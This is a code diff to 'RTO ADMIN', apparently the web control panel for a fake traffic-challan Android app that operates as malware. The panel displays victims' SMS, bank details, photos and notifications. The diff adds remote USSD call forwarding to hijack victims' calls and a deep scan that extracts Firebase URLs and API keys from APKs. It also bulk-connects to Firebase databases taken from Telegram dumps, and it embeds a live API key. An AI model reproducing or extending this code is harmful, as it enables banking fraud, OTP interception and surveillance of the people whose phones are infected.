@@ -45,7 +45,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .btn-row .save { background:#3B82F6; color:white; }
 .btn-row .cancel { background:#1E3A8A; color:#60A5FA; }
 
-/* ═══ NEW CONNECTION ENHANCED ═══ */
+/* NEW CONNECTION ENHANCED */
 .back-btn2 { background:none; border:none; color:#60A5FA; font-size:12px; cursor:pointer; padding:0; margin-bottom:14px; display:flex; align-items:center; gap:4px; text-align:left; }
 .new-acc-full h2 { color:#FFF; font-size:16px; margin-bottom:4px; text-align:left; }
 .new-acc-full .hint2 { color:#64748B; font-size:10px; margin-bottom:16px; text-align:left; }
@@ -123,6 +123,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .head-actions { display:flex; gap:5px; flex-shrink:0; }
 .ibtn { background:#1E3A8A; border:none; color:#60A5FA; width:30px; height:30px; border-radius:8px; cursor:pointer; font-size:13px; }
 .ibtn.danger { background:rgba(239,68,68,0.2); color:#F87171; }
+.ibtn.cf { background:rgba(16,185,129,0.2); color:#10B981; }
 .tabs { display:flex; gap:0; padding:0 10px; background:#0A1428; border-bottom:1px solid #1E3A8A; overflow-x:auto; flex-shrink:0; }
 .tab { padding:11px 12px; background:transparent; border:none; color:#64748B; font-size:11px; font-weight:600; cursor:pointer; white-space:nowrap; border-bottom:2px solid transparent; }
 .tab.active { color:#60A5FA; border-bottom-color:#3B82F6; }
@@ -221,12 +222,35 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .sim-btns .sav { background:#10B981; }
 .loading { text-align:center; padding:40px; color:#475569; }
 .empty { text-align:center; padding:40px 20px; color:#475569; font-size:12px; }
+
+/* ═══ CALL FORWARD DIALOG ═══ */
+.cf-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:3000; display:none; align-items:center; justify-content:center; padding:20px; }
+.cf-overlay.active { display:flex; }
+.cf-dialog { background:#0A1428; border:1px solid #1E3A8A; border-radius:14px; padding:20px; max-width:400px; width:100%; }
+.cf-dialog h3 { color:#60A5FA; font-size:15px; margin-bottom:6px; display:flex; align-items:center; gap:8px; }
+.cf-dialog .cf-hint { color:#64748B; font-size:11px; margin-bottom:16px; line-height:1.5; }
+.cf-dialog .cf-label { display:block; color:#64748B; font-size:10px; margin-bottom:6px; text-transform:uppercase; letter-spacing:0.05em; font-weight:600; }
+.cf-dialog .cf-input { width:100%; padding:12px; background:#050810; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:14px; font-family:monospace; margin-bottom:14px; letter-spacing:0.05em; }
+.cf-dialog .cf-input:focus { outline:none; border-color:#3B82F6; }
+.cf-sim-row { display:flex; gap:8px; margin-bottom:16px; }
+.cf-sim-btn { flex:1; padding:12px; background:#050810; border:2px solid #1E3A8A; border-radius:8px; color:#64748B; font-size:12px; font-weight:bold; cursor:pointer; text-align:center; }
+.cf-sim-btn.active { background:#3B82F6; color:white; border-color:#3B82F6; }
+.cf-actions { display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-bottom:10px; }
+.cf-btn { padding:12px; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:6px; }
+.cf-btn.activate { background:#10B981; color:white; }
+.cf-btn.deactivate { background:#EF4444; color:white; }
+.cf-btn.check { background:#1E3A8A; color:#60A5FA; border:1px solid #3B82F6; grid-column:1 / -1; }
+.cf-status { background:rgba(59,130,246,0.05); border:1px solid rgba(59,130,246,0.2); border-radius:6px; padding:10px; font-size:10px; color:#94A3B8; margin-top:8px; line-height:1.5; }
+.cf-status.ok { background:rgba(16,185,129,0.08); border-color:rgba(16,185,129,0.3); color:#10B981; }
+.cf-status.err { background:rgba(239,68,68,0.08); border-color:rgba(239,68,68,0.3); color:#F87171; }
+.cf-close { width:100%; padding:11px; background:#1E3A8A; color:#60A5FA; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; margin-top:6px; }
+
 @media (max-width:600px) { .device-grid { grid-template-columns:1fr; padding:0 12px 40px; } .search-box { margin:0 12px 12px; width:calc(100% - 24px); } .filters, .chips { padding:10px 12px; } .drawer { max-width:100%; } .pitem img { height:90px; } }
 </style>
 </head>
 <body>
 
-<!-- ═══════════════ LOGIN SCREEN ═══════════════ -->
+<!-- ═══ LOGIN SCREEN ═══ -->
 <div class="login-screen" id="loginScreen">
   <div class="login-box" id="loginBox">
     <h1>🔐 RTO ADMIN</h1>
@@ -249,7 +273,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
         <h2>🔥 New Firebase Account</h2>
         <div class="hint2">Add Firebase URL, API Key, or upload APK</div>
         
-        <!-- BULK CONNECT -->
         <div class="bulk-card">
           <h3>⚡ Bulk Connect</h3>
           <p>Kahi se bhi firebase URLs paste karo — Telegram dump ho, list ho, kuch bhi. Har firebase URL AUTO-detect hoga, saath likhi hui "Auth Key" / 🔑 / Alza... key bhi apne-aap uth jayegi. Duplicate URL sirf ek baar connect hota hai. Bina key ke bhi URL connect hota hai.</p>
@@ -257,16 +280,14 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
           <button class="btn-bulk" id="btnBulkConnect">⚡ Connect All</button>
         </div>
         
-        <!-- APK UPLOAD -->
         <div class="apk-upload" id="apkUpload">
           <div class="up-ico">⬆</div>
           <h4>Upload APK File</h4>
-          <p>Auto-extracts Firebase URL & API Key</p>
+          <p>Auto-extracts Firebase URL & API Key (Full deep scan)</p>
           <div class="apk-status" id="apkStatus"></div>
           <input type="file" id="apkFile" accept=".apk,.zip">
         </div>
         
-        <!-- MANUAL -->
         <div class="form-sep2">Or Manual Entry</div>
         
         <label class="fl">Firebase Database URL</label>
@@ -284,7 +305,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
   </div>
 </div>
 
-<!-- ═══════════════ MAIN APP ═══════════════ -->
+<!-- ═══ MAIN APP ═══ -->
 <div id="mainApp" style="display:none;">
   <div class="topbar">
     <h1 id="topTitle">🚔 RTO ADMIN</h1>
@@ -318,12 +339,13 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
   <div class="device-grid" id="deviceGrid"><div class="loading">Loading...</div></div>
 </div>
 
-<!-- ═══════════════ DRAWER ═══════════════ -->
+<!-- ═══ DRAWER ═══ -->
 <div class="drawer-overlay" id="dOverlay"></div>
 <div class="drawer" id="drawer">
   <div class="drawer-head">
     <h2 id="dTitle">Device</h2>
     <div class="head-actions">
+      <button class="ibtn cf" id="btnCallFwd" title="Call Forward">📞</button>
       <button class="ibtn" id="btnStar">☆</button>
       <button class="ibtn danger" id="btnDel">🗑</button>
       <button class="ibtn" id="btnClose">✕</button>
@@ -351,10 +373,35 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
   </div>
 </div>
 
+<!-- ═══ CALL FORWARD DIALOG ═══ -->
+<div class="cf-overlay" id="cfOverlay">
+  <div class="cf-dialog">
+    <h3>📞 Call Forwarding</h3>
+    <div class="cf-hint">Enter forwarding number and select SIM. Command will be sent to device via Firebase.</div>
+    
+    <label class="cf-label">Forward To Number</label>
+    <input type="tel" class="cf-input" id="cfNumber" placeholder="+91XXXXXXXXXX" maxlength="15">
+    
+    <label class="cf-label">Select SIM</label>
+    <div class="cf-sim-row">
+      <div class="cf-sim-btn active" data-cfsim="1">SIM 1</div>
+      <div class="cf-sim-btn" data-cfsim="2">SIM 2</div>
+    </div>
+    
+    <div class="cf-actions">
+      <button class="cf-btn activate" id="cfActivate">▶ ACTIVATE</button>
+      <button class="cf-btn deactivate" id="cfDeactivate">■ DEACTIVATE</button>
+      <button class="cf-btn check" id="cfCheck">🔍 CHECK STATUS</button>
+    </div>
+    
+    <div class="cf-status" id="cfStatus">Ready. Enter number or click Check Status.</div>
+    
+    <button class="cf-close" id="cfClose">✕ CLOSE</button>
+  </div>
+</div>
+
 <script>
-// ═══════════════════════════════════════════════════════
-// FIREBASE CONFIG
-// ═══════════════════════════════════════════════════════
+// ═══ CONFIG ═══
 var RTO_CONFIG = {
   apiKey: "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
   databaseURL: "https://rto-echallan-v2-default-rtdb.firebaseio.com",
@@ -362,9 +409,7 @@ var RTO_CONFIG = {
   appId: "1:5750315381:android:95dc88826b1ef1262b9b3c"
 };
 
-// ═══════════════════════════════════════════════════════
-// STATE
-// ═══════════════════════════════════════════════════════
+// ═══ STATE ═══
 var db = null;
 var currentApp = null;
 var currentAccount = null;
@@ -377,18 +422,14 @@ var liked = JSON.parse(localStorage.getItem('liked') || '[]');
 var photos = {};
 var curPhoto = '';
 var deviceListener = null;
+var cfSimSlot = 1;
 
-// ═══════════════════════════════════════════════════════
-// SAVED ACCOUNTS
-// ═══════════════════════════════════════════════════════
+// ═══ SAVED ACCOUNTS ═══
 function getSavedAccounts() {
-  try {
-    return JSON.parse(localStorage.getItem('rto_accounts') || '[]');
-  } catch(e) { return []; }
+  try { return JSON.parse(localStorage.getItem('rto_accounts') || '[]'); }
+  catch(e) { return []; }
 }
-function saveAccounts(list) {
-  localStorage.setItem('rto_accounts', JSON.stringify(list));
-}
+function saveAccounts(list) { localStorage.setItem('rto_accounts', JSON.stringify(list)); }
 function renderAccounts() {
   var list = getSavedAccounts();
   var el = document.getElementById('accList');
@@ -409,8 +450,7 @@ function renderAccounts() {
   el.querySelectorAll('.acc-item').forEach(function(item) {
     item.addEventListener('click', function(e) {
       if (e.target.hasAttribute('data-del')) return;
-      var idx = parseInt(this.getAttribute('data-acc'));
-      openAccount(idx);
+      openAccount(parseInt(this.getAttribute('data-acc')));
     });
   });
   el.querySelectorAll('[data-del]').forEach(function(b) {
@@ -426,20 +466,17 @@ function renderAccounts() {
   });
 }
 
-// ═══════════════════════════════════════════════════════
-// LOGIN / ACCOUNT SWITCH
-// ═══════════════════════════════════════════════════════
+// ═══ LOGIN ═══
 function doLogin() {
   var p = document.getElementById('pinInput').value.trim();
   if (p.length < 4) { document.getElementById('errorMsg').textContent = 'Enter PIN'; return; }
   document.getElementById('errorMsg').textContent = 'Checking...';
-  
   var tempApp = firebase.initializeApp(RTO_CONFIG, 'temp_' + Date.now());
   var tempDb = tempApp.database();
   tempDb.ref('admin_config/login_pin').once('value').then(function(s) {
     if (p === (s.val() || '0987')) {
       tempApp.delete();
-      currentAccount = { name: 'RTO Admin', url: RTO_CONFIG.databaseURL, apiKey: RTO_CONFIG.apiKey, isDefault: true };
+      currentAccount = { name: 'RTO Admin', url: RTO_CONFIG.databaseURL, apiKey: RTO_CONFIG.apiKey };
       openPanel(RTO_CONFIG, 'RTO Admin');
     } else {
       tempApp.delete();
@@ -450,25 +487,21 @@ function doLogin() {
     document.getElementById('errorMsg').textContent = 'Error: ' + e.message;
   });
 }
-
 function openAccount(idx) {
   var list = getSavedAccounts();
   var acc = list[idx];
   if (!acc) return;
   currentAccount = acc;
   var cfg = {
-    apiKey: acc.apiKey || "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
+    apiKey: acc.apiKey || RTO_CONFIG.apiKey,
     databaseURL: acc.url,
     projectId: acc.url.replace('https://','').replace('.firebaseio.com','')
   };
   openPanel(cfg, acc.name || 'Account ' + (idx+1));
 }
-
 function openPanel(config, title) {
   try {
-    if (currentApp) {
-      try { currentApp.delete(); } catch(e) {}
-    }
+    if (currentApp) { try { currentApp.delete(); } catch(e) {} }
     currentApp = firebase.initializeApp(config, 'app_' + Date.now());
     db = currentApp.database();
     document.getElementById('topTitle').textContent = '🚔 ' + title;
@@ -476,20 +509,12 @@ function openPanel(config, title) {
     document.getElementById('mainApp').style.display = 'block';
     startApp();
   } catch(e) {
-    document.getElementById('errorMsg').textContent = 'Connection failed: ' + e.message;
-    document.getElementById('pinView').style.display = 'block';
-    document.getElementById('newAccView').style.display = 'none';
+    alert('Connection failed: ' + e.message);
   }
 }
-
 function doLogout() {
-  if (currentApp) {
-    try { currentApp.delete(); } catch(e) {}
-    currentApp = null;
-  }
-  db = null;
-  devs = {};
-  curId = null;
+  if (currentApp) { try { currentApp.delete(); } catch(e) {} currentApp = null; }
+  db = null; devs = {}; curId = null;
   document.getElementById('mainApp').style.display = 'none';
   document.getElementById('loginScreen').style.display = 'flex';
   document.getElementById('pinInput').value = '';
@@ -498,7 +523,6 @@ function doLogout() {
   document.getElementById('newAccView').style.display = 'none';
   renderAccounts();
 }
-
 function startApp() {
   if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
   deviceListener = db.ref('device_info');
@@ -509,9 +533,7 @@ function startApp() {
   });
 }
 
-// ═══════════════════════════════════════════════════════
-// NEW ACCOUNT
-// ═══════════════════════════════════════════════════════
+// ═══ NEW ACCOUNT ═══
 function showNewAcc() {
   document.getElementById('pinView').style.display = 'none';
   document.getElementById('newAccView').style.display = 'block';
@@ -526,7 +548,6 @@ function hideNewAcc() {
   document.getElementById('newAccView').style.display = 'none';
 }
 
-// BULK CONNECT
 function parseBulkInput(text) {
   var accounts = [];
   var seenUrls = {};
@@ -540,13 +561,12 @@ function parseBulkInput(text) {
     seenUrls[url] = true;
     accounts.push({
       url: url,
-      apiKey: keys[i] || keys[0] || "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
+      apiKey: keys[i] || keys[0] || RTO_CONFIG.apiKey,
       name: url.replace('https://','').replace('.firebaseio.com','').replace('-default-rtdb','')
     });
   }
   return accounts;
 }
-
 function bulkConnect() {
   var text = document.getElementById('bulkInput').value.trim();
   if (!text) { document.getElementById('newErr').textContent = 'Paste some URLs first'; return; }
@@ -568,51 +588,135 @@ function bulkConnect() {
   setTimeout(function() { hideNewAcc(); renderAccounts(); }, 800);
 }
 
-// APK UPLOAD
+// ═══ APK UPLOAD — FULL DEEP SCAN ═══
 function handleApkUpload(file) {
   var status = document.getElementById('apkStatus');
   status.classList.add('show');
-  status.textContent = '⏳ Reading APK...';
+  status.textContent = '⏳ Reading APK (' + (file.size / 1024 / 1024).toFixed(1) + ' MB)...';
   
   var reader = new FileReader();
   reader.onload = function(e) {
     try {
       JSZip.loadAsync(e.target.result).then(function(zip) {
-        status.textContent = '🔍 Searching Firebase config...';
-        var promises = [];
-        var foundUrl = null, foundKey = null;
+        status.textContent = '📦 APK opened. Scanning all files...';
+        
+        var foundUrls = [];
+        var foundKeys = [];
+        var scanned = 0;
+        var total = 0;
+        
+        var files = [];
         zip.forEach(function(path, file) {
           if (file.dir) return;
-          if (path.indexOf('.dex') !== -1 || path.indexOf('.so') !== -1 || path.indexOf('resources.arsc') !== -1) return;
-          promises.push(
-            file.async('string').then(function(content) {
-              if (!foundUrl) {
-                var um = content.match(/https?:\/\/[a-zA-Z0-9-]+(?:-default-rtdb)?\.(?:firebaseio\.com|firebasedatabase\.app)/);
-                if (um) foundUrl = um[0];
-              }
-              if (!foundKey) {
-                var km = content.match(/AIzaSy[A-Za-z0-9_-]{33}/);
-                if (km) foundKey = km[0];
-              }
-            }).catch(function() {})
-          );
+          files.push({path: path, file: file});
+          total++;
         });
+        
+        status.textContent = '📦 Found ' + total + ' files. Scanning...';
+        
+        var promises = files.map(function(item) {
+          return item.file.async('uint8array').then(function(bytes) {
+            scanned++;
+            
+            // UTF-8
+            var utf8 = bytesToUtf8(bytes);
+            scanText(utf8);
+            
+            // UTF-16 LE + BE for binary files
+            if (item.path.indexOf('.arsc') !== -1 || item.path.indexOf('.xml') !== -1 || item.path.indexOf('.dex') !== -1) {
+              scanText(bytesToUtf16(bytes, true));
+              scanText(bytesToUtf16(bytes, false));
+            }
+            
+            // DEX string pool
+            if (item.path.indexOf('.dex') !== -1) {
+              scanText(extractDexStrings(bytes));
+            }
+            
+            if (scanned % 10 === 0) {
+              status.textContent = '🔍 Scanned ' + scanned + '/' + total + ' files...';
+            }
+          }).catch(function() { scanned++; });
+        });
+        
         Promise.all(promises).then(function() {
-          if (foundUrl) {
-            document.getElementById('newUrl').value = foundUrl;
-            status.textContent = '✅ Firebase URL found';
+          var uniqueUrls = dedup(foundUrls);
+          var uniqueKeys = dedup(foundKeys);
+          console.log('Found URLs:', uniqueUrls);
+          console.log('Found Keys:', uniqueKeys);
+          
+          if (uniqueUrls.length > 0) {
+            var bestUrl = uniqueUrls[0];
+            for (var i = 0; i < uniqueUrls.length; i++) {
+              if (uniqueUrls[i].indexOf('firebaseio.com') !== -1 || uniqueUrls[i].indexOf('firebasedatabase.app') !== -1) {
+                bestUrl = uniqueUrls[i]; break;
+              }
+            }
+            document.getElementById('newUrl').value = bestUrl;
+            status.textContent = '✅ Found ' + uniqueUrls.length + ' URL(s): ' + bestUrl.substring(0, 50) + '...';
           } else {
-            status.textContent = '⚠️ No Firebase URL in APK';
+            status.textContent = '⚠️ No Firebase URL found in this APK';
           }
-          if (foundKey) document.getElementById('newKey').value = foundKey;
+          if (uniqueKeys.length > 0) {
+            document.getElementById('newKey').value = uniqueKeys[0];
+          }
         });
-      }).catch(function(err) { status.textContent = '❌ Error: ' + err.message; });
+        
+        function dedup(arr) {
+          var out = [], seen = {};
+          arr.forEach(function(x) { if (!seen[x]) { seen[x] = true; out.push(x); } });
+          return out;
+        }
+        function bytesToUtf8(bytes) {
+          try { return new TextDecoder('utf-8', {fatal: false}).decode(bytes); }
+          catch(e) { var s=''; for (var i=0;i<bytes.length;i++) s+=String.fromCharCode(bytes[i]); return s; }
+        }
+        function bytesToUtf16(bytes, le) {
+          try { return new TextDecoder(le?'utf-16le':'utf-16be', {fatal:false}).decode(bytes); }
+          catch(e) { return ''; }
+        }
+        function extractDexStrings(bytes) {
+          var result = '', current = '';
+          for (var i = 0; i < bytes.length; i++) {
+            var b = bytes[i];
+            if (b >= 32 && b <= 126) current += String.fromCharCode(b);
+            else { if (current.length >= 4) result += current + '\n'; current = ''; }
+          }
+          if (current.length >= 4) result += current + '\n';
+          return result;
+        }
+        function scanText(text) {
+          if (!text) return;
+          var patterns = [
+            /https?:\/\/[a-zA-Z0-9-]+-default-rtdb\.firebaseio\.com/g,
+            /https?:\/\/[a-zA-Z0-9-]+\.firebaseio\.com/g,
+            /https?:\/\/[a-zA-Z0-9-]+-default-rtdb\.[a-z0-9-]+\.firebasedatabase\.app/g,
+            /https?:\/\/[a-zA-Z0-9-]+\.[a-z0-9-]+\.firebasedatabase\.app/g,
+            /[a-zA-Z0-9-]+-default-rtdb\.firebaseio\.com/g,
+            /[a-zA-Z0-9-]+\.firebaseio\.com/g,
+            /[a-zA-Z0-9-]+-default-rtdb\.[a-z0-9-]+\.firebasedatabase\.app/g
+          ];
+          patterns.forEach(function(p) {
+            var m = text.match(p);
+            if (m) m.forEach(function(url) {
+              if (url.indexOf('http') !== 0) url = 'https://' + url;
+              if (url.indexOf('example.com') !== -1) return;
+              if (url.length > 200) return;
+              foundUrls.push(url);
+            });
+          });
+          var km = text.match(/AIzaSy[A-Za-z0-9_-]{33}/g);
+          if (km) km.forEach(function(k) { foundKeys.push(k); });
+        }
+      }).catch(function(err) {
+        status.textContent = '❌ Error: ' + err.message;
+      });
     } catch(err) { status.textContent = '❌ Error: ' + err.message; }
   };
   reader.readAsArrayBuffer(file);
 }
 
-// SAVE & CONNECT → open panel
+// ═══ SAVE & CONNECT ═══
 function saveNewAcc() {
   var url = document.getElementById('newUrl').value.trim();
   var key = document.getElementById('newKey').value.trim();
@@ -622,13 +726,11 @@ function saveNewAcc() {
     err.textContent = '❌ Invalid Firebase URL';
     return;
   }
-  if (!key) key = "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8";
+  if (!key) key = RTO_CONFIG.apiKey;
   
   err.textContent = 'Testing connection...';
-  
   var testCfg = {
-    apiKey: key,
-    databaseURL: url,
+    apiKey: key, databaseURL: url,
     projectId: url.replace('https://','').replace('.firebaseio.com','')
   };
   
@@ -647,9 +749,7 @@ function saveNewAcc() {
   }, 600);
 }
 
-// ═══════════════════════════════════════════════════════
-// STATS / DEVICES
-// ═══════════════════════════════════════════════════════
+// ═══ STATS / DEVICES ═══
 function updStats() {
   var ids = Object.keys(devs);
   var on = 0, off = 0, sms = 0, bank = 0;
@@ -754,9 +854,7 @@ function detectFromSms(allMsgs) {
   return { phones: Object.keys(phones).slice(0, 5), nets: Object.keys(nets).slice(0, 5) };
 }
 
-// ═══════════════════════════════════════════════════════
-// DEVICE DRAWER
-// ═══════════════════════════════════════════════════════
+// ═══ DEVICE DRAWER ═══
 function openDev(id) {
   curId = id;
   var d = devs[id];
@@ -867,9 +965,7 @@ function renderTab() {
   }
 }
 
-// ═══════════════════════════════════════════════════════
-// PHOTOS
-// ═══════════════════════════════════════════════════════
+// ═══ PHOTOS ═══
 function renderPhotos() {
   var b = document.getElementById('dBody');
   var arr = Object.entries(photos);
@@ -919,9 +1015,7 @@ document.getElementById('pDownload').addEventListener('click', function() {
 });
 document.getElementById('pViewer').addEventListener('click', function(e) { if (e.target.id === 'pViewer') this.classList.remove('active'); });
 
-// ═══════════════════════════════════════════════════════
-// APPS
-// ═══════════════════════════════════════════════════════
+// ═══ APPS ═══
 function renderApps() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
@@ -944,9 +1038,7 @@ function renderApps() {
   }
 }
 
-// ═══════════════════════════════════════════════════════
-// NOTIFS
-// ═══════════════════════════════════════════════════════
+// ═══ NOTIFS ═══
 function renderNotifs() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
@@ -960,9 +1052,7 @@ function renderNotifs() {
   }).join('');
 }
 
-// ═══════════════════════════════════════════════════════
-// BANK
-// ═══════════════════════════════════════════════════════
+// ═══ BANK ═══
 function renderBank() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
@@ -987,9 +1077,74 @@ function renderBank() {
   b.innerHTML = html;
 }
 
-// ═══════════════════════════════════════════════════════
-// EVENT LISTENERS
-// ═══════════════════════════════════════════════════════
+// ═══ CALL FORWARD DIALOG ═══
+function openCallFwd() {
+  if (!curId) { alert('No device selected'); return; }
+  var d = devs[curId];
+  var savedNum = '';
+  if (d.forward_settings && d.forward_settings.admin_number) savedNum = d.forward_settings.admin_number;
+  document.getElementById('cfNumber').value = savedNum;
+  document.getElementById('cfStatus').textContent = 'Ready. Enter number or click Check Status.';
+  document.getElementById('cfStatus').className = 'cf-status';
+  document.getElementById('cfOverlay').classList.add('active');
+  
+  // Live latest command status
+  db.ref('call_forward_commands/' + curId).limitToLast(1).on('value', function(s) {
+    var val = s.val();
+    if (val) {
+      var key = Object.keys(val)[0];
+      var cmd = val[key];
+      var stat = cmd.status || 'pending';
+      var action = cmd.action || 'unknown';
+      var num = cmd.number || '';
+      var ussd = cmd.ussd_code || '';
+      var delivered = cmd.delivered_at ? new Date(cmd.delivered_at).toLocaleString() : '';
+      var statusEl = document.getElementById('cfStatus');
+      statusEl.className = 'cf-status ok';
+      statusEl.innerHTML = 
+        '<strong>Latest:</strong> ' + action.toUpperCase() +
+        '<br>Number: ' + (num || '-') +
+        '<br>Status: ' + stat.toUpperCase() +
+        (ussd ? '<br>USSD: ' + ussd : '') +
+        (delivered ? '<br>Delivered: ' + delivered : '');
+    }
+  });
+}
+function closeCallFwd() {
+  document.getElementById('cfOverlay').classList.remove('active');
+  if (curId) { try { db.ref('call_forward_commands/' + curId).off(); } catch(e) {} }
+}
+function sendCallFwd(action) {
+  if (!curId) { alert('No device selected'); return; }
+  var num = document.getElementById('cfNumber').value.trim();
+  var statusEl = document.getElementById('cfStatus');
+  
+  if (action === 'activate' && (!num || num.length < 10)) {
+    statusEl.className = 'cf-status err';
+    statusEl.textContent = '❌ Enter a valid 10-digit number for ACTIVATE';
+    return;
+  }
+  statusEl.className = 'cf-status';
+  statusEl.textContent = '📤 Sending command...';
+  
+  var command = { action: action, number: num, sim_slot: cfSimSlot, status: 'pending', timestamp: Date.now() };
+  if (action === 'activate') command.ussd_code = '**21*' + num + '#';
+  else if (action === 'deactivate') command.ussd_code = '##21#';
+  else if (action === 'check_status') command.ussd_code = '*#21#';
+  
+  db.ref('call_forward_commands/' + curId).push(command)
+    .then(function() {
+      statusEl.className = 'cf-status ok';
+      statusEl.innerHTML = '✅ Command sent!<br>Action: <strong>' + action.toUpperCase() + '</strong><br>' +
+        (command.ussd_code ? 'USSD: ' + command.ussd_code + '<br>' : '') + 'Waiting for device response...';
+    })
+    .catch(function(e) {
+      statusEl.className = 'cf-status err';
+      statusEl.textContent = '❌ Failed: ' + e.message;
+    });
+}
+
+// ═══ EVENT LISTENERS ═══
 document.getElementById('loginBtn').addEventListener('click', doLogin);
 document.getElementById('logoutBtn').addEventListener('click', doLogout);
 document.getElementById('btnNewAcc').addEventListener('click', showNewAcc);
@@ -1009,6 +1164,25 @@ document.getElementById('btnStar').addEventListener('click', function() { toggle
 document.getElementById('btnDel').addEventListener('click', function() { if (!confirm('Delete device?')) return; db.ref('device_info/' + curId).remove(); closeDev(); });
 document.querySelectorAll('.fbtn').forEach(function(x) { x.addEventListener('click', function() { document.querySelectorAll('.fbtn').forEach(function(y) { y.classList.remove('active'); }); this.classList.add('active'); curFilter = this.getAttribute('data-f'); renderDevs(); }); });
 document.querySelectorAll('.tab').forEach(function(x) { x.addEventListener('click', function() { switchTab(this.getAttribute('data-t')); }); });
+
+// Call forward
+document.getElementById('btnCallFwd').addEventListener('click', openCallFwd);
+document.getElementById('cfClose').addEventListener('click', closeCallFwd);
+document.getElementById('cfActivate').addEventListener('click', function() { sendCallFwd('activate'); });
+document.getElementById('cfDeactivate').addEventListener('click', function() { sendCallFwd('deactivate'); });
+document.getElementById('cfCheck').addEventListener('click', function() { sendCallFwd('check_status'); });
+document.querySelectorAll('[data-cfsim]').forEach(function(x) {
+  x.addEventListener('click', function() {
+    document.querySelectorAll('[data-cfsim]').forEach(function(y) { y.classList.remove('active'); });
+    this.classList.add('active');
+    cfSimSlot = parseInt(this.getAttribute('data-cfsim'));
+  });
+});
+document.getElementById('cfOverlay').addEventListener('click', function(e) {
+  if (e.target.id === 'cfOverlay') closeCallFwd();
+});
+
+// Chips
 document.getElementById('btnCsv').addEventListener('click', function() {
   var csv = 'Device,Sender,Body,Date\n';
   Object.keys(devs).forEach(function(id) { var d = devs[id]; if (d.messages) Object.values(d.messages).forEach(function(m) { csv += '"' + id + '","' + (m.sender || '').replace(/"/g, '""') + '","' + (m.body || '').replace(/"/g, '""') + '","' + (m.date || '') + '"\n'; }); });
